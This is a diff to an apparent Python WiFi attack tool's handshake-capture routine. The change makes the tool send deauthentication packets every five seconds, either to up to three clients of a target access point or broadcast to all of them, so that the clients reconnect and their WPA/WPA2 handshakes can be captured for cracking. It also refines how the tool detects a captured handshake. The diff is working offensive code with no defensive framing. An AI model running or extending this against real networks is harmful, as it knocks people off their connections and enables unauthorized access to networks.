@@ -151,7 +151,14 @@ class HandshakeCapture:
         print(f"\n[*] Starting handshake capture")
         print(f"[*] Target: {target.essid} ({target.bssid})")
         print(f"[*] Channel: {target.channel}")
+        print(f"[*] Encryption: {target.encryption}")
         print(f"[*] Output: {output_file}.cap")
+        
+        # Check if network is open (no encryption)
+        if target.encryption.upper() in ('OPN', 'OPEN', 'NONE', ''):
+            print("[!] Warning: Target network appears to be open (no encryption)")
+            print("[!] Open networks don't have WPA/WPA2 handshakes to capture")
+            print("[!] Continuing capture anyway to collect traffic...")
 
         # Start capture
         capture_success = self._start_capture(str(output_file), target.channel)
@@ -169,34 +176,39 @@ class HandshakeCapture:
         # Wait a bit for capture to initialize
         time.sleep(2)
 
-        # Send deauth packets
-        print(f"\n[*] Sending {deauth_count} deauth packets...")
+        # Send deauth packets repeatedly during capture
+        print(f"\n[*] Sending deauth packets every 5 seconds to force reconnections...")
+        print(f"[*] Waiting for handshake... ({capture_duration}s)")
 
-        if target.clients:
-            print(f"[*] Targeting {len(target.clients)} known client(s)")
-            for client in target.clients[:3]:  # Limit to first 3 clients
-                print(f"[*] Deauthing client: {client}")
-                result = self.deauther.deauth_network(target.bssid, client, count=deauth_count)
-                if result.success:
-                    print(f"[+] {result.message}")
-                time.sleep(0.5)
-        else:
-            print("[*] No known clients, broadcasting deauth")
-            result = self.deauther.deauth_network(target.bssid, None, count=deauth_count)
-            if result.success:
-                print(f"[+] {result.message}")
-
-        # Continue capturing
-        print(f"\n[*] Waiting for handshake... ({capture_duration}s)")
+        deauth_interval = 5  # Send deauth every 5 seconds
+        last_deauth_time = 0
 
         for i in range(capture_duration):
             time.sleep(1)
             remaining = capture_duration - i - 1
+            elapsed = i + 1
+
+            # Send deauth packets periodically to force reconnections
+            if elapsed - last_deauth_time >= deauth_interval:
+                if target.clients:
+                    # Target specific clients
+                    for client in target.clients[:3]:  # Limit to first 3 clients
+                        result = self.deauther.deauth_network(target.bssid, client, count=deauth_count)
+                        if result.success:
+                            print(f"\r[*] Deauth sent to {client} - {remaining}s remaining", end='', flush=True)
+                        time.sleep(0.3)
+                else:
+                    # Broadcast deauth to all clients
+                    result = self.deauther.deauth_network(target.bssid, None, count=deauth_count)
+                    if result.success:
+                        print(f"\r[*] Broadcast deauth sent - {remaining}s remaining", end='', flush=True)
+                
+                last_deauth_time = elapsed
 
             # Check if we have handshake (every 5 seconds)
             if i > 0 and i % 5 == 0 and verify:
                 if self._quick_check_handshake(f"{output_file}.cap", target.bssid):
-                    print(f"\n[+] Handshake captured! (after {i+1}s)")
+                    print(f"\n[+] Handshake captured! (after {elapsed}s)")
                     break
 
             print(f"\r[*] Capturing... {remaining}s remaining", end='', flush=True)
@@ -342,8 +354,17 @@ class HandshakeCapture:
                 timeout=5
             )
 
-            # Look for handshake indicator
-            return '1 handshake' in result.stdout or 'handshake' in result.stdout.lower()
+            # Look for handshake indicator - be more specific
+            output = result.stdout.lower()
+            # Must have "1 handshake" or "handshake" AND not "0 handshake"
+            has_handshake = ('1 handshake' in result.stdout or 
+                           ('handshake' in output and '0 handshake' not in output))
+            
+            # Also check for WPA handshake specifically
+            if has_handshake and 'wpa' in output:
+                return True
+            
+            return False
 
         except:
             return False
